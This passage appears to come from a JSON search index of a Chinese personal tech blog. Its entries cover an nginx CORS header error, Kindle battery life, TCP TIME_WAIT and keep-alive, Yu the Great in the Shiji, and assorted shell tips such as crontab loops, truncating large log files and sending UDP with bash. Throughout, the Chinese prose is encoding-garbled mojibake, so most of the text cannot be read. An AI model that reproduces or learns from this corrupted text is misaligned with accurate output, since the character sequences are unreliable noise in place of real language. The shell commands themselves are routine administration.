\u0026lsquo;*\u0026rsquo;ï¼Œå¦‚æœåç«¯æœåŠ¡æœ¬èº«å°±å¸¦æœ‰è¿™ä¸ªå¤´ï¼Œé‚£ä¹ˆå¦‚æœä½ åœ¨nginxä¸­å†æ·»åŠ è¿™ä¸ªå¤´ï¼Œå°±ä¼šåœ¨æµè§ˆå™¨ä¸­é‡åˆ°ä¸‹é¢çš„æŠ¥é”™ã€‚è€Œè§£å†³åŠæ³•å°±æ˜¯ä¸è¦åœ¨nginxä¸­è®¾ç½®è¿™ä¸ªå¤´ã€‚**\nAccess to fetch at \u0026#39;http://192.168.40.107:31088/p/security/v2/login\u0026#39; from origin \u0026#39;http://localhost:5000\u0026#39; has been blocked by CORS policy: Response to preflight request doesn\u0026#39;t pass access control check: The \u0026#39;Access-Control-Allow-Origin\u0026#39; header contains multiple values \u0026#39;*, *\u0026#39;, but only one is allowed.","title":"æˆ‘èµ°è¿‡çš„nginxåå‘ä»£ç†çš„å‘"},{"content":"2018å¹´1æœˆ26æ—¥ï¼Œæˆ‘åœ¨äº¬ä¸œä¸Šä¹°äº†ä¸€ä¸ªKindle Paperwhite, è·ç¦»ä»Šå¤©ï¼Œå¤§æ¦‚å·²ç»2å¹´å¤šä¸€ç‚¹äº†ã€‚\næˆ‘æ˜¯ä¸€ä¸ªé‡åº¦è¯»è€…ï¼Œæ¯å¤©éƒ½ä¼šèŠ±ä¸Šä¸€äº›æ—¶é—´å»é˜…è¯»ã€‚æœ€è¿‘ä¸¤å¤©å‘ç°ï¼Œæœ¬æ¥å¯ä»¥è¿ç»­ä¸¤å‘¨ä¸ç”¨å……ç”µçš„kindleã€‚åŸºæœ¬ä¸Šç°åœ¨æ˜¯ç”µé‡ä»¥æ¯å¤©50%çš„é€Ÿåº¦å‡å°‘ã€‚æˆ–è®¸ï¼Œ2å¹´ï¼Œå°±æ˜¯kindleçš„å¯¿å‘½ã€‚\nåˆšå¼€å§‹è¯»ä¹¦æ€»è§‰å¾—æ²¡æœ‰ä»€ä¹ˆè¿›åº¦ï¼Œåæ¥æˆ‘å°±å–œæ¬¢æŠŠæ¯å¤©è¯»ä¹¦çš„è¿›åº¦ç»™è®°å½•ä¸‹æ¥ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯èƒ½å¤Ÿç£ä¿ƒæˆ‘ä¸è¦å·æ‡’ï¼Œ\næˆ‘è¯»ä¹¦æœ‰ä¸ªä¹ æƒ¯ï¼Œæ¯å¤©ä»¥è‡³å°‘1%çš„è¿›åº¦å»è¯»ä¸€æœ¬ä¹¦ï¼Œå¹¶ä¸”æˆ‘ä¼šå°†è¿›åº¦è®°å½•ä¸‹æ¥ã€‚åŸºæœ¬ä¸Šï¼Œæˆ‘æ¯å¤©ä¼šè¯»7-8æœ¬ä¹¦çš„1%ã€‚\nä¸¤å¹´æ—¶é—´å†…æˆ‘è¯»è¿‡çš„ä¹¦ï¼Œè¦æ¯”æˆ‘ä»å°å­¦åˆ°å¤§å­¦è¯»è¿‡çš„ä¹¦éƒ½è¦å¤šã€‚\n","permalink":"https://wdd.js.org/posts/2020/02/amkcs2/","summary":"2018å¹´1æœˆ26æ—¥ï¼Œæˆ‘åœ¨äº¬ä¸œä¸Šä¹°äº†ä¸€ä¸ªKindle Paperwhite, è·ç¦»ä»Šå¤©ï¼Œå¤§æ¦‚å·²ç»2å¹´å¤šä¸€ç‚¹äº†ã€‚\næˆ‘æ˜¯ä¸€ä¸ªé‡åº¦è¯»è€…ï¼Œæ¯å¤©éƒ½ä¼šèŠ±ä¸Šä¸€äº›æ—¶é—´å»é˜…è¯»ã€‚æœ€è¿‘ä¸¤å¤©å‘ç°ï¼Œæœ¬æ¥å¯ä»¥è¿ç»­ä¸¤å‘¨ä¸ç”¨å……ç”µçš„kindleã€‚åŸºæœ¬ä¸Šç°åœ¨æ˜¯ç”µé‡ä»¥æ¯å¤©50%çš„é€Ÿåº¦å‡å°‘ã€‚æˆ–è®¸ï¼Œ2å¹´ï¼Œå°±æ˜¯kindleçš„å¯¿å‘½ã€‚\nåˆšå¼€å§‹è¯»ä¹¦æ€»è§‰å¾—æ²¡æœ‰ä»€ä¹ˆè¿›åº¦ï¼Œåæ¥æˆ‘å°±å–œæ¬¢æŠŠæ¯å¤©è¯»ä¹¦çš„è¿›åº¦ç»™è®°å½•ä¸‹æ¥ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯èƒ½å¤Ÿç£ä¿ƒæˆ‘ä¸è¦å·æ‡’ï¼Œ\næˆ‘è¯»ä¹¦æœ‰ä¸ªä¹ æƒ¯ï¼Œæ¯å¤©ä»¥è‡³å°‘1%çš„è¿›åº¦å»è¯»ä¸€æœ¬ä¹¦ï¼Œå¹¶ä¸”æˆ‘ä¼šå°†è¿›åº¦è®°å½•ä¸‹æ¥ã€‚åŸºæœ¬ä¸Šï¼Œæˆ‘æ¯å¤©ä¼šè¯»7-8æœ¬ä¹¦çš„1%ã€‚\nä¸¤å¹´æ—¶é—´å†…æˆ‘è¯»è¿‡çš„ä¹¦ï¼Œè¦æ¯”æˆ‘ä»å°å­¦åˆ°å¤§å­¦è¯»è¿‡çš„ä¹¦éƒ½è¦å¤šã€‚","title":"kindleé˜…è¯»å™¨çš„å¯¿å‘½"},{"content":"åœ¨äº‹åŠ¡ç»“æŸä¹‹åï¼Œä»ç„¶ä¿æŒåœ¨æ‰“å¼€çŠ¶æ€çš„é“¾æ¥ç§°ä¸ºæŒä¹…è¿æ¥ã€‚éæŒä¹…çš„é“¾æ¥ä¼šåœ¨æ¯ä¸ªäº‹åŠ¡ç»“æŸä¹‹åå°±ä¼šå…³é—­ã€‚\næŒä¹…è¿æ¥çš„å¥½å¤„Â é¿å…ç¼“æ…¢çš„é“¾æ¥å»ºç«‹é˜¶æ®µ é¿å…æ…¢å¯åŠ¨çš„æ‹¥å¡é€‚åº”é˜¶æ®µ Keep-Alive å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¸¦æœ‰Connection: Keep-Aliveå¤´ã€‚å®¢æˆ·ç«¯åœ¨å“åº”å¤´ä¸­å›åº”Connection: Keep-Aliveã€‚åˆ™è¯´æ˜å®¢æˆ·ç«¯åŒæ„æŒä¹…è¿æ¥ã€‚\nå¦‚æœå®¢æˆ·ç«¯ä¸åŒæ„æŒä¹…è¿æ¥ï¼Œå°±ä¼šåœ¨å“åº”å¤´ä¸­è¿”å›Connection: Close\næ³¨æ„äº‹é¡¹\nå³ä½¿æœåŠ¡ç«¯åŒæ„äº†æŒä¹…è¿æ¥ï¼ŒæœåŠ¡ç«¯ä¹Ÿå¯ä»¥éšæ—¶å…³é—­è¿æ¥ HTTP 1.0 åè®®ï¼Œå¿…é¡»æ˜¾å¼ä¼ é€’Connection: Keep-Aliveï¼ŒæœåŠ¡ç«¯æ‰ä¼šæ¿€æ´»æŒä¹…è¿æ¥ HTTP 1.1 åè®®ï¼Œé»˜è®¤å°±æ˜¯æŒä¹…è¿æ¥ åœ¨é€šä¿¡åŒæ–¹ä¸­ï¼Œä¸»åŠ¨å…³é—­è¿æ¥çš„ä¸€æ–¹ä¼šè¿›å…¥TIME_WIATçŠ¶æ€ï¼Œè€Œè¢«åŠ¨å…³é—­çš„ä¸€æ–¹åˆ™ä¸ä¼šè¿›å…¥è¯¥çŠ¶æ€ã€‚\nTIME_WAITè¿æ¥å¤ªå¤š æœåŠ¡ç«¯å¤ªå¤šçš„TIME_WAITè¿æ¥ï¼Œåˆ™è¯´æ˜è¿æ¥æ˜¯æœåŠ¡ç«¯ä¸»åŠ¨å»å…³é—­çš„ã€‚æŸ¥çœ‹äº†å“åº”å¤´ï¼Œå†…å®¹ä¹Ÿæ˜¯Connection: Closeã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œä¸€èˆ¬æƒ…å†µä¸‹TIME_WAITçŠ¶æ€çš„é“¾æ¥è‡³å°‘ä¼šæŒç»­60ç§’ã€‚ä¹Ÿå°±æ˜¯è¯´è¯¥è¿æ¥å ç”¨çš„å†…å­˜è‡³å°‘åœ¨60ç§’å†…ä¸ä¼šé‡Šæ”¾ã€‚\nå½“è¿æ¥å¤ªå¤šæ—¶ï¼Œå°±æœ‰å¯èƒ½äº§ç”Ÿout of memoryçš„é—®é¢˜ï¼Œè€Œæ“ä½œç³»ç»Ÿå°±ä¼šå¾ˆæœ‰å¯èƒ½æŠŠè¿™ä¸ªè¿›ç¨‹ç»™killæ‰ï¼Œè¿›è€Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚\n","permalink":"https://wdd.js.org/network/sq4l53/","summary":"åœ¨äº‹åŠ¡ç»“æŸä¹‹åï¼Œä»ç„¶ä¿æŒåœ¨æ‰“å¼€çŠ¶æ€çš„é“¾æ¥ç§°ä¸ºæŒä¹…è¿æ¥ã€‚éæŒä¹…çš„é“¾æ¥ä¼šåœ¨æ¯ä¸ªäº‹åŠ¡ç»“æŸä¹‹åå°±ä¼šå…³é—­ã€‚\næŒä¹…è¿æ¥çš„å¥½å¤„Â é¿å…ç¼“æ…¢çš„é“¾æ¥å»ºç«‹é˜¶æ®µ é¿å…æ…¢å¯åŠ¨çš„æ‹¥å¡é€‚åº”é˜¶æ®µ Keep-Alive å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œå¸¦æœ‰Connection: Keep-Aliveå¤´ã€‚å®¢æˆ·ç«¯åœ¨å“åº”å¤´ä¸­å›åº”Connection: Keep-Aliveã€‚åˆ™è¯´æ˜å®¢æˆ·ç«¯åŒæ„æŒä¹…è¿æ¥ã€‚\nå¦‚æœå®¢æˆ·ç«¯ä¸åŒæ„æŒä¹…è¿æ¥ï¼Œå°±ä¼šåœ¨å“åº”å¤´ä¸­è¿”å›Connection: Close\næ³¨æ„äº‹é¡¹\nå³ä½¿æœåŠ¡ç«¯åŒæ„äº†æŒä¹…è¿æ¥ï¼ŒæœåŠ¡ç«¯ä¹Ÿå¯ä»¥éšæ—¶å…³é—­è¿æ¥ HTTP 1.0 åè®®ï¼Œå¿…é¡»æ˜¾å¼ä¼ é€’Connection: Keep-Aliveï¼ŒæœåŠ¡ç«¯æ‰ä¼šæ¿€æ´»æŒä¹…è¿æ¥ HTTP 1.1 åè®®ï¼Œé»˜è®¤å°±æ˜¯æŒä¹…è¿æ¥ åœ¨é€šä¿¡åŒæ–¹ä¸­ï¼Œä¸»åŠ¨å…³é—­è¿æ¥çš„ä¸€æ–¹ä¼šè¿›å…¥TIME_WIATçŠ¶æ€ï¼Œè€Œè¢«åŠ¨å…³é—­çš„ä¸€æ–¹åˆ™ä¸ä¼šè¿›å…¥è¯¥çŠ¶æ€ã€‚\nTIME_WAITè¿æ¥å¤ªå¤š æœåŠ¡ç«¯å¤ªå¤šçš„TIME_WAITè¿æ¥ï¼Œåˆ™è¯´æ˜è¿æ¥æ˜¯æœåŠ¡ç«¯ä¸»åŠ¨å»å…³é—­çš„ã€‚æŸ¥çœ‹äº†å“åº”å¤´ï¼Œå†…å®¹ä¹Ÿæ˜¯Connection: Closeã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œä¸€èˆ¬æƒ…å†µä¸‹TIME_WAITçŠ¶æ€çš„é“¾æ¥è‡³å°‘ä¼šæŒç»­60ç§’ã€‚ä¹Ÿå°±æ˜¯è¯´è¯¥è¿æ¥å ç”¨çš„å†…å­˜è‡³å°‘åœ¨60ç§’å†…ä¸ä¼šé‡Šæ”¾ã€‚\nå½“è¿æ¥å¤ªå¤šæ—¶ï¼Œå°±æœ‰å¯èƒ½äº§ç”Ÿout of memoryçš„é—®é¢˜ï¼Œè€Œæ“ä½œç³»ç»Ÿå°±ä¼šå¾ˆæœ‰å¯èƒ½æŠŠè¿™ä¸ªè¿›ç¨‹ç»™killæ‰ï¼Œè¿›è€Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚","title":"TIME_WAITä¸æŒä¹…è¿æ¥"},{"content":"æœ€æ—©å¬è¯´â€œä¸‰è¿‡å®¶é—¨è€Œä¸å…¥â€ï¼Œæ˜¯è¯´ç¦¹æ²»æ°´å¤§å…¬æ— ç§ï¼Œè·¯è¿‡å®¶é—¨éƒ½æ²¡æœ‰å›å®¶ã€‚\næœ€è¿‘çœ‹åˆ°å²è®°ï¼Œå‘ç°è¿™å¥è¯åŸæœ¬æ˜¯\nç¦¹ä¼¤å…ˆäººçˆ¶é²§(å‘éŸ³å’Œæ»šç›¸åŒ)åŠŸä¹‹ä¸æˆå—è¯›ï¼Œä¹ƒåŠ³èº«ç„¦æ€ï¼Œå±…å¤–åä¸‰å¹´ï¼Œè¿‡å®¶é—¨ä¸æ•¢å…¥\n\u0026ldquo;ä¸‰è¿‡å®¶é—¨è€Œä¸å…¥\u0026quot;è¿™ä¸ªçŸ­è¯­ä¸­, ä¸åŸæ–‡å°‘ä¸€ä¸ªâ€œæ•¢â€å­—ï¼Œå°‘äº†ä¸€ä¸ªå­—ï¼Œå«ä¹‰å·®è·å¾ˆå¤§ã€‚\næ²¡æœ‰æ•¢å­—ï¼Œè¯´æ˜æ˜¯è‡ªå·±ä¸»åŠ¨çš„ã€‚åŠ ä¸Šæ•¢å­—ï¼Œåˆ™ä¼šè®©äººæ€è€ƒã€‚ç¦¹ä¸ºä»€ä¹ˆä¸æ•¢å›å®¶ï¼Ÿä»–åœ¨æ€•ä»€ä¹ˆå‘¢ï¼Ÿ\nè¿™é‡Œå°±éœ€è¦æåˆ°ç¦¹çš„çˆ¶äº²é²§ã€‚\né²§æ²»æ°´ä¹å¹´ï¼Œæ²¡æœ‰æŠŠæ°´æ²»ç†å¥½ã€‚åœ¨èˆœå·¡è§†çš„æ—¶å€™ï¼Œè¢«èµæ­»åœ¨ç¾½å±±ã€‚\nèˆœç™»ç”¨ï¼Œæ‘„è¡Œå¤©å­ä¹‹æ”¿ï¼Œå·¡ç‹©ã€‚è¡Œè§†é²§ä¹‹æ²»æ°´æ— çŠ¶ï¼Œä¹ƒæ®›ï¼ˆå‘éŸ³å’Œå³ç›¸åŒï¼‰é²§äºç¾½å±±ä»¥æ­»\næ‰€ä»¥ï¼Œå¦‚æœç¦¹æ²»ä¸å¥½æ°´ï¼Œä½ æƒ³ç¦¹çš„ä¸‹åœºæ˜¯ä»€ä¹ˆï¼Ÿ\n","permalink":"https://wdd.js.org/posts/2020/01/encss4/","summary":"æœ€æ—©å¬è¯´â€œä¸‰è¿‡å®¶é—¨è€Œä¸å…¥â€ï¼Œæ˜¯è¯´ç¦¹æ²»æ°´å¤§å…¬æ— ç§ï¼Œè·¯è¿‡å®¶é—¨éƒ½æ²¡æœ‰å›å®¶ã€‚\næœ€è¿‘çœ‹åˆ°å²è®°ï¼Œå‘ç°è¿™å¥è¯åŸæœ¬æ˜¯\nç¦¹ä¼¤å…ˆäººçˆ¶é²§(å‘éŸ³å’Œæ»šç›¸åŒ)åŠŸä¹‹ä¸æˆå—è¯›ï¼Œä¹ƒåŠ³èº«ç„¦æ€ï¼Œå±…å¤–åä¸‰å¹´ï¼Œè¿‡å®¶é—¨ä¸æ•¢å…¥\n\u0026ldquo;ä¸‰è¿‡å®¶é—¨è€Œä¸å…¥\u0026quot;è¿™ä¸ªçŸ­è¯­ä¸­, ä¸åŸæ–‡å°‘ä¸€ä¸ªâ€œæ•¢â€å­—ï¼Œå°‘äº†ä¸€ä¸ªå­—ï¼Œå«ä¹‰å·®è·å¾ˆå¤§ã€‚\næ²¡æœ‰æ•¢å­—ï¼Œè¯´æ˜æ˜¯è‡ªå·±ä¸»åŠ¨çš„ã€‚åŠ ä¸Šæ•¢å­—ï¼Œåˆ™ä¼šè®©äººæ€è€ƒã€‚ç¦¹ä¸ºä»€ä¹ˆä¸æ•¢å›å®¶ï¼Ÿä»–åœ¨æ€•ä»€ä¹ˆå‘¢ï¼Ÿ\nè¿™é‡Œå°±éœ€è¦æåˆ°ç¦¹çš„çˆ¶äº²é²§ã€‚\né²§æ²»æ°´ä¹å¹´ï¼Œæ²¡æœ‰æŠŠæ°´æ²»ç†å¥½ã€‚åœ¨èˆœå·¡è§†çš„æ—¶å€™ï¼Œè¢«èµæ­»åœ¨ç¾½å±±ã€‚\nèˆœç™»ç”¨ï¼Œæ‘„è¡Œå¤©å­ä¹‹æ”¿ï¼Œå·¡ç‹©ã€‚è¡Œè§†é²§ä¹‹æ²»æ°´æ— çŠ¶ï¼Œä¹ƒæ®›ï¼ˆå‘éŸ³å’Œå³ç›¸åŒï¼‰é²§äºç¾½å±±ä»¥æ­»\næ‰€ä»¥ï¼Œå¦‚æœç¦¹æ²»ä¸å¥½æ°´ï¼Œä½ æƒ³ç¦¹çš„ä¸‹åœºæ˜¯ä»€ä¹ˆï¼Ÿ","title":"è®ºç¦¹ä¸‰è¿‡å®¶é—¨è€Œä¸å…¥çš„çœŸå®åŸå› "},{"content":"åœ¨ã€Štcp/ipè¯¦è§£å·ä¸€ã€‹ä¸­ï¼Œæœ‰å¹…å›¾ä»‹ç»äº†TCPçš„çŠ¶æ€è¿ç§»ï¼ŒTCPçš„çŠ¶æ€è½¬ç§»å¹¶ä¸ç®€å•ï¼Œæˆ‘ä»¬æœ¬æ¬¡é‡ç‚¹å…³æ³¨TIME_WAITçŠ¶æ€ã€‚\nTIME-WAIT ä¸»æœº1å‘èµ·FINå…³é—­è¿æ¥è¯·æ±‚ï¼Œä¸»æœº2å‘é€ACKç¡®è®¤ï¼Œç„¶åä¹Ÿå‘é€FINã€‚ä¸»æœº1åœ¨æ”¶åˆ°FINä¹‹åï¼Œæƒ³ä¸»æœº2å‘é€äº†ACKã€‚\nåœ¨ä¸»æœº1å‘é€ACKæ—¶ï¼Œä¸»æœº1å°±è¿›å…¥äº†TIME-WAITçŠ¶æ€ã€‚\nä¸»åŠ¨å‘èµ·å…³é—­è¿æ¥çš„ä¸€æ–¹ä¼šæœ‰TIME-WAITçŠ¶æ€ å¦‚æœä¸¤æ–¹åŒæ—¶å‘èµ·å…³é—­è¿æ¥è¯·æ±‚ï¼Œé‚£ä¹ˆä¸¤æ–¹éƒ½ä¼šè¿›å…¥TIME-WAITçŠ¶æ€ TIME-WAITçš„æ—¶é•¿åœ¨ /proc/sys/net/ipv4/tcp_fin_timeoutÂ ä¸­é…ç½®ï¼Œä¸€èˆ¬æ˜¯60s ä¸ºä»€ä¹ˆè¦æœ‰TIME-WAITçŠ¶æ€ï¼Ÿ å¤ªå¤šTIME-WAITé“¾æ¥æ˜¯å¦æ„å‘³æœ‰æ•…éšœï¼Ÿ ","permalink":"https://wdd.js.org/network/yoc1k0/","summary":"åœ¨ã€Štcp/ipè¯¦è§£å·ä¸€ã€‹ä¸­ï¼Œæœ‰å¹…å›¾ä»‹ç»äº†TCPçš„çŠ¶æ€è¿ç§»ï¼ŒTCPçš„çŠ¶æ€è½¬ç§»å¹¶ä¸ç®€å•ï¼Œæˆ‘ä»¬æœ¬æ¬¡é‡ç‚¹å…³æ³¨TIME_WAITçŠ¶æ€ã€‚\nTIME-WAIT ä¸»æœº1å‘èµ·FINå…³é—­è¿æ¥è¯·æ±‚ï¼Œä¸»æœº2å‘é€ACKç¡®è®¤ï¼Œç„¶åä¹Ÿå‘é€FINã€‚ä¸»æœº1åœ¨æ”¶åˆ°FINä¹‹åï¼Œæƒ³ä¸»æœº2å‘é€äº†ACKã€‚\nåœ¨ä¸»æœº1å‘é€ACKæ—¶ï¼Œä¸»æœº1å°±è¿›å…¥äº†TIME-WAITçŠ¶æ€ã€‚\nä¸»åŠ¨å‘èµ·å…³é—­è¿æ¥çš„ä¸€æ–¹ä¼šæœ‰TIME-WAITçŠ¶æ€ å¦‚æœä¸¤æ–¹åŒæ—¶å‘èµ·å…³é—­è¿æ¥è¯·æ±‚ï¼Œé‚£ä¹ˆä¸¤æ–¹éƒ½ä¼šè¿›å…¥TIME-WAITçŠ¶æ€ TIME-WAITçš„æ—¶é•¿åœ¨ /proc/sys/net/ipv4/tcp_fin_timeoutÂ ä¸­é…ç½®ï¼Œä¸€èˆ¬æ˜¯60s ä¸ºä»€ä¹ˆè¦æœ‰TIME-WAITçŠ¶æ€ï¼Ÿ å¤ªå¤šTIME-WAITé“¾æ¥æ˜¯å¦æ„å‘³æœ‰æ•…éšœï¼Ÿ ","title":"æ¼«è¯TCP TIME-WAITçŠ¶æ€ã€ingã€‘"},{"content":"å‘½ä»¤è¡Œç¼–è¾‘ å‘å·¦ç§»åŠ¨å…‰æ ‡\tctrl + b å‘å³ç§»åŠ¨å…‰æ ‡\tctrl + f ç§»åŠ¨å…‰æ ‡åˆ°è¡Œå°¾\tctrl + e ç§»åŠ¨å…‰æ ‡åˆ°è¡Œé¦–\tctrl + a æ¸…é™¤å‰é¢ä¸€ä¸ªè¯\tctrl + w æ¸…é™¤å…‰æ ‡åˆ°è¡Œé¦–\tctrl + u æ¸…é™¤å…‰æ ‡åˆ°è¡Œå°¾\tctrl + k å‘½ä»¤è¡Œæœç´¢\tctrl + r è§£å‹ä¸å‹ç¼© 1ã€å‹ç¼©å‘½ä»¤ï¼š å‘½ä»¤æ ¼å¼ï¼š\ntar -zcvf å‹ç¼©æ–‡ä»¶å .tar.gz è¢«å‹ç¼©æ–‡ä»¶å å¯å…ˆåˆ‡æ¢åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œå‹ç¼©æ–‡ä»¶åå’Œè¢«å‹ç¼©æ–‡ä»¶åéƒ½å¯åŠ å…¥è·¯å¾„ã€‚\n2ã€è§£å‹ç¼©å‘½ä»¤ï¼š å‘½ä»¤æ ¼å¼ï¼š\ntar -zxvf å‹ç¼©æ–‡ä»¶å.tar.gz è§£å‹ç¼©åçš„æ–‡ä»¶åªèƒ½æ”¾åœ¨å½“å‰çš„ç›®å½•ã€‚\ncrontab æ¯éš”xç§’æ‰§è¡Œä¸€æ¬¡ æ¯éš”5ç§’\n* * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done æ¯éš”15ç§’\n* * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 awkä»ç¬¬äºŒè¡Œå¼€å§‹è¯»å– awk \u0026#39;NR\u0026gt;2{print $1}\u0026#39; æŸ¥æ‰¾å¤§æ–‡ä»¶ï¼Œå¹¶æ¸…ç©ºæ–‡ä»¶å†…å®¹ find /var/log -type f -size +1M -exec truncate --size 0 \u0026#39;{}\u0026#39; \u0026#39;;\u0026#39; switch case è¯­å¥ echo \u0026#39;Input a number between 1 to 4\u0026#39; echo \u0026#39;Your number is:\\c\u0026#39; read aNum case $aNum in 1) echo \u0026#39;You select 1\u0026#39; ;; 2) echo \u0026#39;You select 2\u0026#39; ;; 3) echo \u0026#39;You select 3\u0026#39; ;; 4) echo \u0026#39;You select 4\u0026#39; ;; *) echo \u0026#39;You do not select a number between 1 to 4\u0026#39; ;; esac ä»¥$å¼€å¤´çš„ç‰¹æ®Šå˜é‡ echo $$ # è¿›ç¨‹pid echo $# # æ”¶åˆ°çš„å‚æ•°ä¸ªæ•° echo $@ # åˆ—è¡¨æ–¹å¼çš„å‚æ•° $1 $2 $3 echo $? # ä¸Šä¸ªè¿›ç¨‹çš„é€€å‡ºç  echo $* # ç±»ä¼¼åˆ—è¡¨æ–¹å¼ï¼Œä½†æ˜¯å‚æ•°è¢«å½“åšä¸€ä¸ªå®ä½“, \u0026#34;$1c$2c$3\u0026#34; cæ˜¯IFSçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ echo $0 # è„šæœ¬å echo $1 $2 $3 # ç¬¬ä¸€ã€ç¬¬äºŒã€ç¬¬ä¸‰ä¸ªå‚æ•° for i in $@ do echo $i done for j in $@ do echo $j done åˆ¤æ–­gitä»“åº“æ˜¯å¦clean check_is_repo_clean () { if [ -n \u0026#34;$(git status --porcelain)\u0026#34; ]; then echo \u0026#34;Working directory is not clean\u0026#34; exit 1 fi } æ–‡ä»¶æ‰¹å¤„ç† for inå¾ªç¯ for f in *.txt; do mv $f $f.gz; done for d in *.gz; do gunzip $d; done shell é‡å®šå‘åˆ°/dev/null ls \u0026amp;\u0026gt;/dev/null; #æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºéƒ½ä¸æƒ³çœ‹ ls 1\u0026gt;/dev/null; #ä¸æƒ³çœ‹æ ‡å‡†è¾“å‡º ls 2\u0026gt;/dev/null; æ ‡å‡†é”™è¯¯ä¸æƒ³çœ‹ sed: -e expression #1, char 21: unknown option to `s' å‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œä¸€èˆ¬æ˜¯è¦æ›¿æ¢çš„å­—ç¬¦ä¸²ä¸­ä¹Ÿæœ‰/ç¬¦å·ï¼Œæ‰€ä»¥è¦æŠŠåˆ†éš”ç¬¦æ”¹æˆ ! æˆ–è€… |\nsed -i \u0026#34;s!WJ_CONF_URL!$WJ_CONF_URL!g\u0026#34; file.txt å‘é€UDPæ¶ˆæ¯ åœ¨shellæ˜¯bashçš„æ—¶å€™ï¼Œ å¯ä»¥ä½¿ç”¨ echo æˆ–è€… catå°†å†…å®¹é‡å®šå‘åˆ° /dev/udp/ip/portä¸­ï¼Œæ¥å‘é€udpæ¶ˆæ¯\necho \u0026#34;hello\u0026#34; \u0026gt; /dev/udp/192.168.1.1/8000 grepæ’é™¤è‡ªèº« ä¸‹é¢æŸ¥æ‰¾åç§°åŒ…æ‹¬rtpproxyçš„è¿›ç¨‹ï¼Œgrepå‡ºæ¥æ‰¾åˆ°è¿™ä¸ªè¿›ç¨‹å¤–ï¼Œè¿˜æ‰¾åˆ°äº†grepè¿™æ¡è¯­å¥çš„è¿›ç¨‹ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯å¤šä½™çš„ã€‚\nâœ ~ ps aux | grep rtpproxy root 3353 0.3 0.0 186080 968 ? Sl 2019 250:05 rtpproxy -f -l root 31440 0.0 0.0 112672 980 pts/0 S+ 10:12 0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn rtpproxy ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ä¸­æ‹¬å·ï¼Œå°†æœç´¢å…³é”®è¯çš„ç¬¬ä¸€ä¸ªå­—ç¬¦åŒ…è£¹èµ·æ¥ï¼Œå°±å¯ä»¥æ’é™¤grepè‡ªèº«ã€‚\n[root@localhost ~]# ps aux | grep \u0026#39;[r]tpproxy\u0026#39; root 3353 0.3 0.0 186080 968 ? Sl 2019 250:06 rtpproxy -f -l ","permalink":"https://wdd.js.org/shell/all-in-one/","summary":"å‘½ä»¤è¡Œç¼–è¾‘ å‘å·¦ç§»åŠ¨å…‰æ ‡\tctrl + b å‘å³ç§»åŠ¨å…‰æ ‡\tctrl + f ç§»åŠ¨å…‰æ ‡åˆ°è¡Œå°¾\tctrl + e ç§»åŠ¨å…‰æ ‡åˆ°è¡Œé¦–\tctrl + a æ¸…é™¤å‰é¢ä¸€ä¸ªè¯\tctrl + w æ¸…é™¤å…‰æ ‡åˆ°è¡Œé¦–\tctrl + u æ¸…é™¤å…‰æ ‡åˆ°è¡Œå°¾\tctrl + k å‘½ä»¤è¡Œæœç´¢\tctrl + r è§£å‹ä¸å‹ç¼© 1ã€å‹ç¼©å‘½ä»¤ï¼š å‘½ä»¤æ ¼å¼ï¼š\ntar -zcvf å‹ç¼©æ–‡ä»¶å .tar.gz è¢«å‹ç¼©æ–‡ä»¶å å¯å…ˆåˆ‡æ¢åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œå‹ç¼©æ–‡ä»¶åå’Œè¢«å‹ç¼©æ–‡ä»¶åéƒ½å¯åŠ å…¥è·¯å¾„ã€‚\n2ã€è§£å‹ç¼©å‘½ä»¤ï¼š å‘½ä»¤æ ¼å¼ï¼š\ntar -zxvf å‹ç¼©æ–‡ä»¶å.tar.gz è§£å‹ç¼©åçš„æ–‡ä»¶åªèƒ½æ”¾åœ¨å½“å‰çš„ç›®å½•ã€‚\ncrontab æ¯éš”xç§’æ‰§è¡Œä¸€æ¬¡ æ¯éš”5ç§’\n* * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done æ¯éš”15ç§’\n* * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 awkä»ç¬¬äºŒè¡Œå¼€å§‹è¯»å– awk \u0026#39;NR\u0026gt;2{print $1}\u0026#39; æŸ¥æ‰¾å¤§æ–‡ä»¶ï¼Œå¹¶æ¸…ç©ºæ–‡ä»¶å†…å®¹ find /var/log -type f -size +1M -exec truncate --size 0 \u0026#39;{}\u0026#39; \u0026#39;;\u0026#39; switch case è¯­å¥ echo \u0026#39;Input a number between 1 to 4\u0026#39; echo \u0026#39;Your number is:\\c\u0026#39; read aNum case $aNum in 1) echo \u0026#39;You select 1\u0026#39; ;; 2) echo \u0026#39;You select 2\u0026#39; ;; 3) echo \u0026#39;You select 3\u0026#39; ;; 4) echo \u0026#39;You select 4\u0026#39; ;; *) echo \u0026#39;You do not select a number between 1 to 4\u0026#39; ;; esac ä»¥$å¼€å¤´çš„ç‰¹æ®Šå˜é‡ echo $$ # è¿›ç¨‹pid echo $# # æ”¶åˆ°çš„å‚æ•°ä¸ªæ•° echo $@ # åˆ—è¡¨æ–¹å¼çš„å‚æ•° $1 $2 $3 echo $?","title":"å¸¸ç”¨shellæŠ€å·§"},{"content":"å‚è€ƒ https://www.opensips.org/Documentation/Tutorials-WebSocket-2-2 